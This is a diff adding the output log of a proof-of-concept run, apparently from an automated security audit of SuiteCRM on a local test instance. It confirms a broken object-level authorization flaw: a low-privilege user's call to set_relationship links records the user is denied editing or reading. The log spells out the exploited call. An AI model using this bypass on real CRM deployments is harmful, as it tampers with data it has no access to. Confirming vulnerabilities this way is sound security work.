@@ -1,0 +1,23 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-078/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-078/../.venv
+========================================================================
+VULN-078: set_relationship BOLA -- relate records with view-only primary + zero-access related
+target: http://localhost:33116
+========================================================================
+[SETUP] admin web + legacy REST session
+[SETUP] low-priv user; Role denies Accounts edit AND Contacts view+edit entirely
+[OK] low-priv user mod_ea62f9a5 id=220c800d-3ab1-4551-93da-8139709867b2, role 6443fb97-8a84-46c9-86b9-eb79486d84bd
+[SETUP] admin creates the primary Account and the related (victim) Contact
+[OK] Account id=b8ce128d-189a-4eae-bb08-c7f64db937a0 name='Stage10 VULN-078 Account a_384cf3e1'; Contact id=13aa69e8-5ae7-400b-a50f-6be60f3f4302 last_name='Stage10VULN078c_7a0d871c'
+[STEP] control (a): low-priv attempts to EDIT the Account (must be denied)
+[INFO] edit attempt response: {'name': 'Access Denied', 'number': 40, 'description': 'You do not have access'}
+[PROOF] control (a): Account name unchanged in DB = True
+[STEP] control (b): low-priv attempts to READ the Contact (must be denied)
+[INFO] read attempt response: {'name': 'Access Denied', 'number': 40, 'description': 'You do not have access'}
+[PROOF] control (b): Contact read denied = True
+[STEP] VULNERABLE: low-priv calls set_relationship(Accounts/<account_id>, 'contacts', [<contact_id>])
+[INFO] set_relationship response: {'created': 1, 'failed': 0, 'deleted': 0}
+[INFO] accounts_contacts rows for this pair: [{'id': 'db19577a-9343-44f0-9180-8e1749c0cc28', 'account_id': 'b8ce128d-189a-4eae-bb08-c7f64db937a0', 'contact_id': '13aa69e8-5ae7-400b-a50f-6be60f3f4302', 'deleted': '0'}]
+[PROOF] low-priv (Accounts edit=NONE, Contacts view=edit=NONE) related Account<->Contact = True (API created=1, DB row exists=True)
+[OK] Confirmed: a user with only view (not edit) on the primary Account and ZERO access (view or edit) to the Contact successfully related them -- a real accounts_contacts row was written -- while the same user's direct edit of the Account and read of the Contact were both correctly denied.
+==> VULN-078: CONFIRMED — low-priv user (Accounts edit=NONE, Contacts view=edit=NONE) related Account b8ce128d-189a-4eae-bb08-c7f64db937a0 <-> Contact 13aa69e8-5ae7-400b-a50f-6be60f3f4302 via set_relationship; accounts_contacts row confirmed in DB; direct edit/read of the same records via the same session were denied
